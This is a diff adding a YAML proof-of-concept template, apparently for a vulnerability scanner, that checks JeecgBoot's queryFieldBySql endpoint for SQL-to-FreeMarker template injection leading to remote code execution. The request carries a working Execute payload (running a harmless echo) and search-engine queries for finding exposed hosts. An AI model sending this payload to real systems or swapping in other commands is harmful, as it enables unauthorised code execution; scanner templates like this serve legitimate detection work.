@@ -1,0 +1,30 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="JEECG"
+    hunter-query: app.name=="JeecgBoot"
+    quake-query: app:"Jeecg-Boot"
+    zoomeye-query: app:"JEECG"
+    threatbook-query: #
+    cve: 
+    cnvd:
+
+name: poc-yaml-jeecgboot-queryFieldBySql-sqli-rce
+transport: http
+set:
+    s1: randomInt(100000, 200000)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /jeecg-boot/jmreport/queryFieldBySql
+            headers:
+                Content-Type: application/json
+            body: |
+                {"sql":"select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"echo {{s1}} \") }' "}
+        expression: response.body_string.contains("解析成功") && response.body_string.contains(string(s1))
+expression: r0()
